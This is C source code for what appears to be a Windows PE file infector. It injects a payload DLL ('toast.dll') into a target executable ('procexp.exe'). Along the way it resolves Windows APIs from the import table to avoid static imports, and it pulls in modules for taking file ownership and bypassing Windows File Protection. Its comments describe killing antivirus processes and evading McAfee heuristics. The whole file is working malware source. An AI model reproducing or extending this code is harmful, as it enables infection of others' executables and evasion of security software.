
#include <windows.h>
#include <stdio.h>
#include <wincrypt.h>
#include <winsvc.h>
#include <tlhelp32.h> // for av process kill

#define PEINF_VER 23

#define TARGET "procexp.exe"	// Set the name of the file to infect
#define DLL_FILE "toast.dll"	// Set the name of the dll payload

#define REAL_INFECT


void InitAPIbyStr(DWORD *adr[], HANDLE h, char *data);
BOOL isSystemNT();

#include "..\api\kernel32.h"
#include "..\api\crtdll.h"
#include "..\api\user32.h"
#include "..\api\sfc.h"
#include "..\api\sfc_os.h"
#include "..\api\shell32.h"
#include "..\api\advapi32.h"
#include "..\api\api.h"

#include "..\token.c"	// EditOwnToken (take_ownership)


///////////////////////////////////////////////////////////////
// structures for memory access 

 typedef struct wMEMORY_STRUCT{
  WORD word0;        
 } wMEMORY;

 typedef struct dMEMORY_STRUCT{
  DWORD dword0;        
 } dMEMORY;

///////////////////////////////////////////////////////////////
// Check is system NT or not 

BOOL SYSTEM_NT=FALSE;

BOOL isSystemNT()
{
	OSVERSIONINFO osver;

	if (SYSTEM_NT!=0)
		return TRUE;
	
	osver.dwOSVersionInfoSize = sizeof(osver);
	_GetVersionEx(&osver);

	if (osver.dwPlatformId == VER_PLATFORM_WIN32_NT)
		SYSTEM_NT=TRUE;

	return SYSTEM_NT;
}

///////////////////////////////////////////////////////////////

#include "..\strings\my_strcpy.c"
#include "..\strings\rndstr.c"
#include "..\infect\fileown.c"

#include "..\infect\pehead.h"

 #include "..\infect\c_code.h"

DWORD EMUL=1;
DWORD AntiEmulator() 
{ 
	return 1;
} // always return OK
DWORD GetTicks1()
{
} 

#include "..\infect\c_code.c"
#include "..\infect\peinf.c"
#include "..\kernel.c"


///////////////////////////////////////////////////////////////
// Main Thread 

DWORD MainThread(LPVOID GPA)
{
	DWORD len;
	HANDLE hh, h;
	BOOL res;
	unsigned char *dll;

	_srand(_GetTickCount()); 

	// Get the size of the infection code in order to get the size of original EP to move
	szinfcode = WriteOrGetLen_C_CODE(NULL,0,0,0);
	
	// Allocate space for payload dll
	#define MAX_ALLOC 5000000
	dll = _LocalAlloc(LMEM_FIXED, MAX_ALLOC);
	if (dll == NULL) 
		exit(1); 

	// Get dll buffer
	h = _CreateFile(DLL_FILE, GENERIC_READ|FILE_SHARE_READ, 0, 0, OPEN_EXISTING, 0, 0);
	if (h == INVALID_HANDLE_VALUE)
		return FALSE;

	_ReadFile(h, dll, MAX_ALLOC,& len, NULL);
	_CloseHandle(h);

	// Infection
	dll_mem = dll;
	dll_len = len;
	res = InfectPE(TARGET);

	_LocalFree(dll);
}


///////////////////////////////////////////////////////////////
// Entry point 

int main()
{
	PE_HEADER *pe;
	DWORD a0, a, eiRVA, q;

	SECTNAME[0]=0;

	a0 = (DWORD)MainThread;               // any address inside our code
	a  = ((DWORD)MainThread>>16)<<16;     // align it by 64kb

	// Find PE header
	// Step can be only 2^x, where x from 0 to 16 (1-0x10000)
	// to kill McAfee heuristic we use this
	a = FindPEheader(a, a0, 4, &pe);

	// Get import table RVA
	eiRVA = pe->importrva;

	// Import table (get addr of first imported from kernel32 func)
	for (q = 0; q < pe->importsize; q += sizeof(IMPORT_DIRECTORY_TABLE_ENTRY))
	{
		IMPORT_DIRECTORY_TABLE_ENTRY *idte=(LPVOID)(a+eiRVA+q);

		if (idte->ImportLookUp==0)
			break;
		if (_KERNEL32 != NULL) 
			break;

		ProcessDLLimports(a, idte);
	}

	if (_KERNEL32 == NULL) 
		return;

	InitKernel32a();  // GetModuleHandle,LoadLibrary
	InitKernel32();
	InitCRTDLL();
	InitADVAPI32();
	InitUser32();   
	InitSFC();     
	InitShell32();
	InitSFC_OS(); 

	MainThread(NULL);

	// we need this for exe (real import from kernel32.dll)
	GetModuleHandle("kernel32.dll");  //Vista bugfix, instead of ExitThread
}
